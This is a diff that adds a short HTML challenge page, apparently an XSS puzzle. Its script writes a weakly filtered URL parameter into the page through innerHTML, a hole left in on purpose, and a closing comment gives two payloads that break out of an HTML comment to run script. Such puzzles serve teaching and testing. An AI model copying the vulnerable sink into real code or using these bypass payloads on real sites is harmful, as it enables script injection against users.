@@ -1,0 +1,15 @@
+<!-- Challenge -->
+<div id="pwnme"></div>
+
+<script>
+    var input = (new URL(location).searchParams.get('debug') || '').replace(/[\!\-\/\#\&\;\%]/g, '_');
+    var template = document.createElement('template');
+    template.innerHTML = input;
+    pwnme.innerHTML = "<!-- <p> DEBUG: " + template.outerHTML + " </p> -->";
+</script>
+
+<!--
+    ?debug=<?php><svg onload=alert(1337)>
+
+    ?debug=<?><svg onload=alert(1337)>
+-->
